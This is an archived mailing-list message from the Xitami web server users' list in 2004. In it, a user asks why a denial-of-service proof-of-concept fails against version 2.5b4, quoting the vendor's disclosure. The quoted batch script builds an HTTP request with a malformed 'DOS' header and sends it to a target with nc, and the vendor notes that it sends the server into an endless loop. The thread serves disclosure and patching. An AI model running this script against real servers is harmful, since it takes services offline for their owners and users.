@@ -1,0 +1,136 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] Xitami DOS reported
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="006046.html">
+   <LINK REL="Next"  HREF="006048.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] Xitami DOS reported
+   </H1>
+    <B>xitami@lists.xitami.org
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] Xitami DOS reported">xitami@lists.xitami.org
+       </A><BR>
+    <I>Tue, 27 Jul 2004 20:36:23 +0000</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="006046.html">[Xitami] Failure to build on Linux
+</A></li>
+        <LI> Next message: <A HREF="006048.html">[Xitami] Neophyte Needs Guidance
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#6047">[ date ]</a>
+              <a href="thread.html#6047">[ thread ]</a>
+              <a href="subject.html#6047">[ subject ]</a>
+              <a href="author.html#6047">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Hello All,  :) :)
+
+Several web pages were discovered, one of which came from the IETF Hypertext Transfer Protocol (HTTP) Working Group.
+
+If I understand HTTP HEADERs correctly as an example a widely used HTTP HEADER is:
+
+        GET /a_web_page.html HTTP/1.1
+        Host: AwebSITE.com  (or IP address)
+        Referer: LASTwebSITE.com
+
+
+So, the line of code below that copies the string DOS to the http.tmp file should cause the DOS.
+
+And, with Xitami V2.5b4 (bw3225b4.exe) the DOS does not occure.
+
+
+Have I done something wrong or can V2.5b4 avoid the DOS???? I did not downloaded the source code for the V2.5b4 version.
+
+Thanks for your time, help, and advise!!!!  :) :)
+
+Jerry
+
+
+-------------- Original message from <A HREF="mailto:jglong3@att.net">jglong3@att.net</A>: -------------- 
+&gt;<i> 
+</I>&gt;<i> Hello Forum, :) ;| 
+</I>&gt;<i> 
+</I>&gt;<i> Sorry,,,,I forgot to mention that the effort in this case is to produce the DOS 
+</I>&gt;<i> and the version of Xitami is: 
+</I>&gt;<i> 
+</I>&gt;<i>           V2.5b4 
+</I>&gt;<i> 
+</I> 
+&gt;<i> &gt; &gt; @echo off 
+</I>&gt;<i> &gt; &gt; :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+</I>&gt;<i> &gt; &gt; :Application: Xitami Web Server 
+</I>&gt;<i> &gt; &gt; :Vendors: <A HREF="http://www.xitami.com/xiopen_2_5.zip">http://www.xitami.com/xiopen_2_5.zip</A> 
+</I>&gt;<i> &gt; &gt; :Version: v2.5c1 
+</I>&gt;<i> &gt; &gt; :Platforms: Windows 
+</I>&gt;<i> &gt; &gt; :Bug: D.O.S 
+</I>&gt;<i> &gt; &gt; :Date: 2004-07-15 
+</I>&gt;<i> &gt; &gt; :Author: CoolICE 
+</I>&gt;<i> &gt; &gt; :e-mail: CoolICE#China.com 
+</I>&gt;<i> &gt; &gt; :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+</I>&gt;<i> &gt; &gt; if '%1'=='' echo Usage:%0 target [port]&amp;&amp;goto :eof 
+</I>&gt;<i> &gt; &gt; set PORT=80 
+</I>&gt;<i> &gt; &gt; if not '%2'=='' set PORT=%2 
+</I>&gt;<i> &gt; &gt; for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe echo Need nc. 
+</I>&gt;<i> &gt; &gt; exe&amp;&amp;goto :eof 
+</I>&gt;<i> &gt; &gt; echo GET / HTTP/1.0&gt;http.tmp 
+</I>&gt;<i> &gt; &gt; echo HOST: %1&gt;&gt;http.tmp 
+</I>&gt;<i> &gt; &gt; echo DOS&gt;&gt;http.tmp 
+</I>&gt;<i> &gt; &gt; echo.&gt;&gt;http.tmp 
+</I>&gt;<i> &gt; &gt; nc -w 10 %1 %PORT% &lt; http.tmp 
+</I>&gt;<i> &gt; &gt; del http.tmp 
+</I>&gt;<i> &gt; &gt; -------------------------------------------------------------- 
+</I>&gt;<i> &gt; &gt; 
+</I>&gt;<i> &gt; &gt; The denial of service is this: a malformed header (without the ':') causes 
+</I>&gt;<i> the 
+</I>&gt;<i> &gt; &gt; server to enter an endless loop. 
+</I>&gt;<i> &gt; &gt; 
+</I>&gt;<i> &gt; &gt; This DOS affects all versions of Xitami. For those building from source, the 
+</I>&gt;<i> &gt; &gt; affected file is smthttpl.c, and the patch is in the function 
+</I>&gt;<i> &gt; &gt; http_parse_header: 
+</I>&gt;<i> &gt; &gt; 
+</I>&gt;<i> &gt; &gt; We are in the process of releasing new binaries, which will be on Xitami.com 
+</I>&gt;<i> &gt; &gt; in a very short while. 
+</I>&gt;<i> &gt; &gt; 
+</I>&gt;<i> &gt; &gt; -- 
+</I>&gt;<i> &gt; &gt; Pieter Hintjens 
+</I>&gt;<i> &gt; &gt; iMatix Corporation 
+</I>&gt;<i> &gt; &gt; 
+</I>&gt;<i> &gt; 
+</I>&gt;<i> &gt; 
+</I>&gt;<i> &gt; -- 
+</I>&gt;<i> &gt; Xitami Users Mailing List -- For Xitami support 
+</I>&gt;<i> &gt; To unsubscribe: <A HREF="http://lists.xitami.org/mailman/listinfo/xitami">http://lists.xitami.org/mailman/listinfo/xitami</A> 
+</I>&gt;<i> 
+</I>&gt;<i> 
+</I>&gt;<i> -- 
+</I>&gt;<i> Xitami Users Mailing List -- For Xitami support 
+</I>&gt;<i> To unsubscribe: <A HREF="http://lists.xitami.org/mailman/listinfo/xitami">http://lists.xitami.org/mailman/listinfo/xitami</A> 
+</I>
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="006046.html">[Xitami] Failure to build on Linux
+</A></li>
+	<LI> Next message: <A HREF="006048.html">[Xitami] Neophyte Needs Guidance
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#6047">[ date ]</a>
+              <a href="thread.html#6047">[ thread ]</a>
+              <a href="subject.html#6047">[ subject ]</a>
+              <a href="author.html#6047">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
